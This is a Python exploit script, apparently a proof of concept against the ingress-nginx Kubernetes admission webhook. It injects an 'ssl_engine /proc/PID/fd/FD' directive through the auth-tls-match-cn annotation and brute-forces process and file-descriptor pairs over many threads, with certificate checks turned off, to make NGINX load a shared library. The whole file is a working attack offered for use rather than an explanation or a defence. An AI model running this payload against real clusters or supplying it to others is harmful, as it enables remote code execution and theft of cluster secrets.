#!/usr/bin/env python3

import requests
import json
import threading
import concurrent.futures
import urllib3
from queue import Queue
import sys

# Global configuration for easy customization
CONFIG = {
    "url": "https://localhost:8443/",
    "headers": {
        "Content-Type": "application/json"
    },
    "pid_range": range(1, 50),  # Range of process IDs to test
    "fd_range": range(1, 100),  # Range of file descriptors to test
    "max_workers": 50,          # Number of concurrent threads
    "request_timeout": 10,      # Request timeout in seconds
    "namespace": "default",     # Kubernetes namespace
    "tls_secret": "ingress-nginx/tls-poc"  # TLS secret reference
}

def create_payload(pid, fd):
    """
    Create the JSON payload for the admission webhook request with the specified PID and FD.
    
    Args:
        pid (int): Process ID to test
        fd (int): File descriptor to test
        
    Returns:
        dict: The complete payload for the admission webhook request
    """
    # Create the TLS match CN string with NGINX configuration injection
    tls_match_cn = f"CN=abc #(\n){{}}\n }}}}\nssl_engine /proc/{pid}/fd/{fd};\n#"
    
    return {
        "apiVersion": "admission.k8s.io/v1",
        "kind": "AdmissionReview",
        "request": {
            "uid": "11111111-2222-3333-4444-555555555555",
            "kind": {
                "group": "networking.k8s.io",
                "version": "v1",
                "kind": "Ingress"
            },
            "resource": {
                "group": "networking.k8s.io",
                "version": "v1",
                "resource": "ingresses"
            },
            "namespace": CONFIG["namespace"],
            "operation": "CREATE",
            "object": {
                "apiVersion": "networking.k8s.io/v1",
                "kind": "Ingress",
                "metadata": {
                    "name": "deads",
                    "annotations": {
                        "nginx.ingress.kubernetes.io/auth-tls-match-cn": tls_match_cn,
                        "nginx.ingress.kubernetes.io/auth-tls-secret": CONFIG["tls_secret"]
                    }
                },
                "spec": {
                    "ingressClassName": "nginx",
                    "rules": [
                        {
                            "host": "myservicea.foo.org",
                            "http": {
                                "paths": [
                                    {
                                        "path": "/",
                                        "pathType": "Prefix",
                                        "backend": {
                                            "service": {
                                                "name": "myservicea",
                                                "port": {
                                                    "number": 80
                                                }
                                            }
                                        }
                                    }
                                ]
                            }
                        }
                    ]
                }
            }
        }
    }

def try_pid_fd_combination(pid, fd, results_queue, success_event):
    """
    Test a specific PID/FD combination by sending a request to the admission webhook.
    
    Args:
        pid (int): Process ID to test
        fd (int): File descriptor to test
        results_queue (Queue): Queue to store successful results
        success_event (threading.Event): Event to signal when a successful combination is found
    """
    # Check if a successful combination has already been found
    if success_event.is_set():
        return
        
    payload = create_payload(pid, fd)

    try:
        # Suppress InsecureRequestWarning
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        response = requests.post(
            CONFIG["url"],
            headers=CONFIG["headers"],
            data=json.dumps(payload),
            verify=False,
            timeout=CONFIG["request_timeout"]
        )

        # Check if the response contains JSON data
        try:
            response_json = response.json()
            if 'response' in response_json and 'status' in response_json['response']:
                message = response_json['response']['status'].get('message', '')
                
                # Check for failure indicators in the message
                failure_indicators = [
                    "could not load the shared library",
                    "Permission denied",
                    "engine routines::dso not found"
                ]
                
                is_success = all(indicator not in message for indicator in failure_indicators)
                
                if is_success:
                    print(f"[+] Potential success found! /proc/{pid}/fd/{fd}")
                    results_queue.put((pid, fd, message))
                    # Signal that a successful combination has been found
                    success_event.set()
                else:
                    print(f"[-] Attempt /proc/{pid}/fd/{fd} => Failed")
            else:
                print(f"[-] Attempt /proc/{pid}/fd/{fd} => Invalid response structure")
        except ValueError:
            print(f"[-] Attempt /proc/{pid}/fd/{fd} => Invalid JSON response")

    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed for PID={pid}, FD={fd}: {e}")

def main():
    """
    Main function to orchestrate the brute force testing of PID/FD combinations.
    """
    results_queue = Queue()
    success_event = threading.Event()
    
    print("[*] Starting PID/FD combination testing...")
    print(f"[*] Testing PIDs: {CONFIG['pid_range'].start}-{CONFIG['pid_range'].stop-1}")
    print(f"[*] Testing FDs: {CONFIG['fd_range'].start}-{CONFIG['fd_range'].stop-1}")
    print(f"[*] Using {CONFIG['max_workers']} concurrent workers\n")
    
    # Generate all combinations of PIDs and FDs
    combinations = [
        (pid, fd) for pid in CONFIG["pid_range"] 
        for fd in CONFIG["fd_range"]
    ]
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=CONFIG["max_workers"]) as executor:
        futures = {
            executor.submit(try_pid_fd_combination, pid, fd, results_queue, success_event): (pid, fd) 
            for pid, fd in combinations
        }
        
        for future in concurrent.futures.as_completed(futures):
            pid, fd = futures[future]
            try:
                future.result()
            except Exception as exc:
                print(f"[-] Error with {pid}/{fd}: {exc}")
    
    # Process results
    if not results_queue.empty():
        print("\n[+] Successful combinations found:")
        print("=" * 60)
        while not results_queue.empty():
            pid, fd, message = results_queue.get()
            print(f"[+] SUCCESS: /proc/{pid}/fd/{fd}")
            print(f"[+] Response message:\n{message}\n")
    else:
        print("\n[-] No successful combinations found.")

if __name__ == "__main__":
    main()
